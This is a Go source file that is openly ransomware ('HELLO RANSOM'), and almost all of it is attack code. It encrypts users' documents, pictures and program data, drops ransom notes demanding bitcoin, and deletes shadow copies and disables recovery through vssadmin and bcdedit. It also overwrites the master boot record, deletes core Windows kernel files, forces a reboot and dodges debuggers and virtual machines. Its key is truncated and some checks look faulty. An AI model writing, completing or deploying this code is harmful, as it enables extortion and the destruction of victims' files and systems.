package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha512"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/ncruces/zenity"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ======================
// RANSOMWARE CONFIGURATION
// ======================
const (
	C2_SERVER         = "http://darkc2.example/ransomware"
	RANSOM_AMOUNT     = 2.5 // BTC
	BTC_ADDRESS       = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
	CONTACT_EMAIL     = "kerneldestroyer@protonmail.com"
	MAX_THREADS       = 32
	MAX_FILE_SIZE     = 100 * 1024 * 1024 // 100MB
	PUBLIC_KEY_PEM    = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
... [truncated for security] ...
-----END PUBLIC KEY-----`
)

var ENCRYPT_EXTENSIONS = []string{
	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg",
	".png", ".gif", ".mp3", ".mp4", ".avi", ".mkv", ".zip", ".rar", ".7z", ".sql",
	".db", ".mdb", ".sln", ".cs", ".cpp", ".h", ".go", ".py", ".js", ".html",
	".php", ".asp", ".aspx", ".rb", ".pl", ".sh", ".bat", ".ps1", ".vb", ".config",
	".dll", ".exe", ".sys", ".bak", ".vmdk", ".vmx", ".vhd", ".txt"
}

// ======================
// KERNEL-LEVEL PAYLOADS
// ======================
const (
	MBR_PAYLOAD = "\xEB\x63\x90\x48\x45\x4C\x4C\x4F\x52\x41\x4E\x53\x4F\x4D\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA"
)

// ======================
// DATA STRUCTURES
// ======================
type SystemInfo struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	IP          string `json:"ip"`
	CPU         int    `json:"cpu_cores"`
	IsAdmin     bool   `json:"is_admin"`
	UEFI        bool   `json:"uefi"`
}

type RansomNote struct {
	Message   string  `json:"message"`
	VictimID  string  `json:"victim_id"`
	Amount    float64 `json:"amount"`
	BTC       string  `json:"btc_address"`
	Email     string  `json:"contact"`
	Deadline  string  `json:"deadline"`
}

// ======================
// UTILITY FUNCTIONS
// ======================
func init() {
	// Initialize entropy source
	crand.Reader.Read(make([]byte, 16))
}

func generateVictimID() string {
	hash := sha512.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP)))
	return hex.EncodeToString(hash.Sum(nil))[:24]
}

func isVM() bool {
	// Simplified VM check
	_, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\ACPI\DSDT\VBOX__`, registry.QUERY_VALUE)
	if err == nil {
		return true
	}
	
	cmd := exec.Command("wmic", "computersystem", "get", "model")
	output, _ := cmd.CombinedOutput()
	return strings.Contains(strings.ToLower(string(output)), "virtual")
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()

	// Check UEFI
	uefi := false
	_, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\SecureBoot\State`, registry.QUERY_VALUE)
	if err == nil {
		uefi = true
	}

	return SystemInfo{
		Hostname:    hostname,
		Username:    user.Username,
		OS:          runtime.GOOS,
		IP:          ip,
		CPU:         runtime.NumCPU(),
		IsAdmin:     isAdmin(),
		UEFI:        uefi,
	}
}

// ======================
// KERNEL-LEVEL OPERATIONS
// ======================
func enablePrivilege(privilege string) error {
	var token windows.Token
	currentProcess, _ := windows.GetCurrentProcess()
	err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var luid windows.LUID
	privStr, _ := windows.UTF16FromString(privilege)
	err = windows.LookupPrivilegeValue(nil, &privStr[0], &luid)
	if err != nil {
		return err
	}

	privs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}

	return windows.AdjustTokenPrivileges(token, false, &privs, 0, nil, nil)
}

func overwriteMBR() {
	if isVM() || !isAdmin() {
		return
	}

	enablePrivilege("SeShutdownPrivilege")
	enablePrivilege("SeTakeOwnershipPrivilege")

	drive := "\\\\.\\PhysicalDrive0"
	h, err := windows.CreateFile(
		windows.StringToUTF16Ptr(drive),
		windows.GENERIC_WRITE|windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return
	}
	defer windows.CloseHandle(h)

	payload := make([]byte, 512)
	copy(payload, []byte(MBR_PAYLOAD))

	var bytesWritten uint32
	windows.WriteFile(h, payload, &bytesWritten, nil)
}

func corruptSystem() {
	// Critical system modification
	exec.Command("cmd", "/c", "vssadmin delete shadows /all /quiet").Run()
	exec.Command("cmd", "/c", "bcdedit /set {default} recoveryenabled no").Run()
	exec.Command("cmd", "/c", "bcdedit /set {default} bootstatuspolicy ignoreallfailures").Run()
	
	// System file destruction
	system32 := filepath.Join(os.Getenv("SystemRoot"), "System32")
	criticalFiles := []string{
		"ntoskrnl.exe",
		"hal.dll",
		"winload.exe",
		"winresume.exe",
	}
	
	for _, file := range criticalFiles {
		os.Remove(filepath.Join(system32, file))
	}
}

// ======================
// ENCRYPTION FUNCTIONS
// ======================
func encryptFile(filePath string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey) {
	if strings.HasSuffix(filePath, ".HELLORANSOM") {
		return
	}

	file, err := os.OpenFile(filePath, os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil || fileInfo.Size() == 0 || fileInfo.Size() > MAX_FILE_SIZE {
		return
	}

	data := make([]byte, fileInfo.Size())
	_, err = file.Read(data)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return
	}

	encrypted := cipher.Seal(nil, nonce, data, nil)

	// Encrypt the nonce with RSA
	encryptedNonce, err := rsa.EncryptOAEP(sha512.New(), crand.Reader, publicKey, nonce, nil)
	if err != nil {
		return
	}

	// Overwrite original file
	file.Seek(0, 0)
	file.Write(encryptedNonce)
	file.Write(encrypted)
	file.Truncate(int64(len(encryptedNonce) + len(encrypted)))

	// Rename file
	newPath := filePath + ".HELLORANSOM"
	os.Rename(filePath, newPath)
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID, publicKey)
	}
}

func encryptFiles(victimID string, publicKey *rsa.PublicKey) {
	salt := make([]byte, 64)
	crand.Read(salt)
	password := make([]byte, 32)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 100000, 32, sha512.New)

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(72 * time.Hour).Format("2006-01-02 15:04:05 MST")
	note := RansomNote{
		Message: "HELLO RANSOM ATTACK\n\n" +
			"Your system has been encrypted by military-grade ransomware\n" +
			"All critical system components including MBR have been destroyed\n\n" +
			"Recovery is IMPOSSIBLE without our decryption service\n\n" +
			"To restore your system:\n" +
			"1. Send " + fmt.Sprintf("%.2f", RANSOM_AMOUNT) + " BTC to: " + BTC_ADDRESS + "\n" +
			"2. Email " + CONTACT_EMAIL + " with your ID: " + victimID + "\n" +
			"3. You will receive decryption instructions\n\n" +
			"WARNING: System will become unusable after " + deadline,
		VictimID:  victimID,
		Amount:    RANSOM_AMOUNT,
		BTC:       BTC_ADDRESS,
		Email:     CONTACT_EMAIL,
		Deadline:  deadline,
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	paths := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "HELLO_RANSOM_README.txt"),
		filepath.Join(os.Getenv("USERPROFILE"), "Documents", "HELLO_RANSOM_README.txt"),
		filepath.Join(os.Getenv("SystemRoot"), "HELLO_RANSOM_README.txt"),
	}

	for _, path := range paths {
		os.WriteFile(path, noteJSON, 0644)
	}

	// Parallel encryption
	pathsToEncrypt := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		filepath.Join(os.Getenv("USERPROFILE"), "Pictures"),
		filepath.Join(os.Getenv("ProgramData")),
	}

	jobs := make(chan string, 10000)
	var wg sync.WaitGroup

	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, publicKey, &wg)
	}

	for _, path := range pathsToEncrypt {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			if info.Size() == 0 || info.Size() > MAX_FILE_SIZE {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

// ======================
// SYSTEM DISABLING
// ======================
func disableSystem() {
	// 1. Destroy recovery capabilities
	exec.Command("cmd", "/c", "vssadmin delete shadows /all /quiet").Run()
	exec.Command("cmd", "/c", "bcdedit /set {default} recoveryenabled no").Run()
	exec.Command("cmd", "/c", "bcdedit /set {default} bootstatuspolicy ignoreallfailures").Run()

	// 2. Overwrite MBR
	overwriteMBR()

	// 3. Critical system destruction
	go func() {
		time.Sleep(30 * time.Second)
		corruptSystem()
	}()

	// 4. Forced shutdown
	go func() {
		time.Sleep(120 * time.Second)
		exec.Command("shutdown", "/r", "/t", "0", "/f").Run()
	}()
}

// ======================
// VISUAL EFFECTS
// ======================
func showRansomScreen(victimID string) {
	message := fmt.Sprintf(
		"HELLO RANSOM ATTACK\n\n"+
			"YOUR SYSTEM HAS BEEN ENCRYPTED\n\n"+
			"ID: %s\n"+
			"Send %.2f BTC to: %s\n"+
			"Contact: %s\n\n"+
			"System will shut down in 2 minutes",
		victimID, RANSOM_AMOUNT, BTC_ADDRESS, CONTACT_EMAIL,
	)

	for i := 0; i < 10; i++ {
		zenity.Error(
			message,
			zenity.Title("HELLO RANSOMWARE"),
			zenity.Width(500),
			zenity.Height(300),
		)
		time.Sleep(10 * time.Second)
	}
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	// Anti-analysis checks
	if isDebugging() || isVM() {
		os.Exit(0)
	}

	victimID := generateVictimID()
	
	// Parse public key
	block, _ := pem.Decode([]byte(PUBLIC_KEY_PEM))
	if block == nil {
		return
	}
	publicKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return
	}

	// Main attack sequence
	go encryptFiles(victimID, publicKey.(*rsa.PublicKey))
	go disableSystem()
	go showRansomScreen(victimID)

	// Keep process alive
	time.Sleep(5 * time.Minute)
}

// ======================
// HELPER FUNCTIONS
// ======================
func isDebugging() bool {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return member && err == nil
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
